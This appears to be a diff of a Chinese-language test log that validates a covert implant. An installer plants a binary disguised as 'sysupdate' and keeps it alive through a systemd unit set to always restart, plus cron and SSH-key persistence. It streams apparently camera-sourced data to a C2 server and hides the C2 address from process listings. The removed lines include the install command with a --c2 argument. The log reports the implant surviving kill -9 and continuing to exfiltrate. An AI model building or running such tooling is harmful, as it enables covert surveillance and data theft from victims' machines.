@@ -1,42 +1,40 @@
-R2 systemd 运行时驻留 —— 已验证
+=== R2 真 systemd 运行时驻留（可重生成）===
 
-环境：PID/mount namespace 内，/lib/systemd/systemd 249 作真正的 PID 1。
-这不是模拟：ns 内 /proc/1/comm = systemd，systemctl daemon-reload 返回 0，
-systemd-journald / systemd-resolved / systemd-logind / dbus-daemon 均被拉起。
+[OK]   F0  C2 收端已起  port=33529
+[OK]   F0b 找到 ns init 的宿主 PID  3231
+[OK]   F1  真 systemd 作 PID 1 且 daemon-reload 成功  
+[OK]   F2  ns 内 PID 1 是 systemd  systemd
+    ---- 已生成一键脚本 1972923 字节 ----
+    ---- install 输出 ----
+    [OK] 环境: arch=x86_64 systemd=1 backend=v4l2 front=无
+    [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+    [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+    [OK] 二进制已安装 /usr/local/bin/sysupdate
+    [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
+    [OK] systemd 单元静态校验通过
+    [OK] systemd 驻留成功（enabled + active, pid=160）
+    [OK] cron 条目已写入（分位 31）
+    [WARN] 未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）
+    [OK] 试运行已送达 C2（204288 字节信元，tcp://127.0.0.1:33529）
+    [INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+    [WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+    计数: 成功 9  失败 0  警告 2
+[OK]   F3  install 报驻留成功（成功行 + 失败 0）  
+[OK]   F4  ActiveState=active  active
+[OK]   F5  UnitFileState=enabled  enabled
+[OK]   F6  Restart=always  always
+[OK]   F7  MainPID!=0  160
+[OK]   F8  C2 收到信元  17364480 字节 / 1 连接
+[OK]   F9  kill -9 后 Restart 拉起新进程  160 -> 195
+[OK]   F10 NRestarts 已递增  1
+[OK]   F11 重启后继续回传  新增 5107200 字节
+[OK]   F12 驻留进程 cmdline 不含 C2/密钥  /usr/local/bin/sysupdate
+[OK]   F13 卸载后服务停止  inactive
+[OK]   F14 卸载后落点全清  ls: cannot access '/etc/sysupdate': No such file or director
 
-复现命令（见 redline/ns_systemd_boot.sh）：
-  unshare --fork --pid --mount-proc --mount --propagation private ./ns_systemd_boot.sh
-  nsenter -t <systemd_pid> -m -p sh onekey.sh install --c2 127.0.0.1:<port> --backend v4l2
+=== 汇总 ===
+RESULT: pass=16 fail=0
+EXIT=0
 
-实测输出（真实执行，非推演）：
-
-  [OK] 环境: arch=x86_64 systemd=1 backend=v4l2 front=无
-  [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，182728 字节）
-  [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
-  [OK] 二进制已安装 /usr/local/bin/sysupdate
-  [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
-  [OK] systemd 单元静态校验通过
-  [OK] systemd 驻留成功（enabled + active, pid=194）
-  [OK] cron 条目已写入（分位 35）
-  [OK] 试运行已送达 C2（427520 字节信元）
-  计数: 成功 9  失败 0  警告 2
-
-  systemctl show sysupdate:
-    ActiveState=active  SubState=running  UnitFileState=enabled
-    Restart=always      MainPID=194
-
-  kill -9 194 后（等 RestartSec）：
-    MainPID=0 -> 222      NRestarts=0 -> 1
-    ActiveState=activating(auto-restart) -> active   SubState=running
-    父进程 = PID 1 (systemd)
-    C2 持续收到字节（4 秒窗口 +10063360 字节）
-
-  进程 cmdline（驻留态）：
-    /usr/local/bin/sysupdate
-    匹配 key|sink|127.0.0.1 的次数 = 0
-    environ 含 CAMD_SINK = 1
-
-  systemctl stop sysupdate -> ActiveState=inactive  MainPID=0
-  uninstall -> 成功 3 失败 0，六个落点全部不存在
-
-本证据不覆盖：真实开机重启后的存活（无真机可重启）。
+# ---- 源码指纹（改了下列任一文件，本证据即失效）----
+SRC 21_exfil/onekey.sh bbd0e2707549004b32baaef6b745b4d647f692ce1d49d4794b3ee0a1a5e49514 52762
